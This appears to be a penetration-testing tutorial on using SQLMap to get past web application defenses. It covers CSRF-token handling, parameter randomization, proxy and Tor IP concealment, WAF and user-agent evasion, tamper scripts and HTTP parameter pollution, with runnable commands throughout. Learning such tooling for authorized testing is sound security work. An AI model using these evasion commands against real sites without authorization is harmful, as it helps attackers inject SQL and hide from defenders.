# Bypassing Web Application Protections

In an ideal scenario, targets have no protections that prevent automatic exploitation. However, automated tools often encounter defensive mechanisms. SQLMap includes several built-in options to help bypass these protections.

## Anti-CSRF Token Bypass

Anti-CSRF (Cross-Site Request Forgery) tokens are a common first line of defense against automation tools. Each HTTP request requires a valid token that's only available to users who actually visited the page.

SQLMap can bypass this with the `--csrf-token` option. Specify the token parameter name, and SQLMap will automatically parse responses to extract fresh tokens for subsequent requests.

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

If you don't specify the token name, SQLMap will prompt you if it detects common infixes (csrf, xsrf, token).

## Unique Value Bypass

Some applications require unique values in predefined parameters. Use `--randomize` to randomize a specific parameter before each request:

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```

## Calculated Parameter Bypass

When a parameter value must be calculated from another (e.g., `h=MD5(id)`), use `--eval` with Python code:

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

## IP Address Concealing

To conceal your IP or bypass IP-based blacklists:

- **Proxy**: `--proxy="socks4://177.39.187.70:33283"`
- **Proxy List**: `--proxy-file=proxies.txt`
- **Tor Network**: `--tor` (requires local SOCKS4 proxy on port 9050/9150)
- **Verify Tor**: `--check-tor` (connects to torproject.org)

## WAF Bypass

SQLMap tests for WAF (Web Application Firewall) presence by sending malicious payloads with non-existent parameters. It uses the `identYwaf` library to identify 80+ known WAF solutions.

Skip WAF detection to reduce noise:
```bash
sqlmap --skip-waf
```

## User-Agent Blacklisting Bypass

If you encounter immediate 5XX errors, the default SQLMap user-agent may be blacklisted. Use:

```bash
sqlmap --random-agent
```

## Tamper Scripts

Tamper scripts modify requests before sending them to bypass protections. Chain multiple scripts with `--tamper`:

```bash
sqlmap --tamper=between,randomcase
```

### Popular Tamper Scripts

| Script | Description |
|--------|-------------|
| `0eunion` | Replaces UNION with e0UNION |
| `base64encode` | Base64-encodes payload |
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #` |
| `randomcase` | Randomizes keyword case (SELECT → SEleCt) |
| `space2comment` | Replaces spaces with `/**/` |
| `space2dash` | Replaces spaces with `--` |
| `space2plus` | Replaces spaces with `+` |
| `symboliclogical` | Replaces AND/OR with `&&`/`\|\|` |

View all scripts:
```bash
sqlmap --list-tampers
```

## Miscellaneous Bypasses

**Chunked Transfer Encoding**: Split POST body into chunks with `--chunked` to split blacklisted keywords across chunks.

**HTTP Parameter Pollution (HPP)**: Split payloads across multiple same-named parameters with `?id=1&id=UNION&id=SELECT...`. Works on platforms that concatenate duplicate parameters (e.g., ASP).

---

**Note**: When protection is detected, expect additional security mechanisms. Modern protections continuously evolve, limiting evasion options.
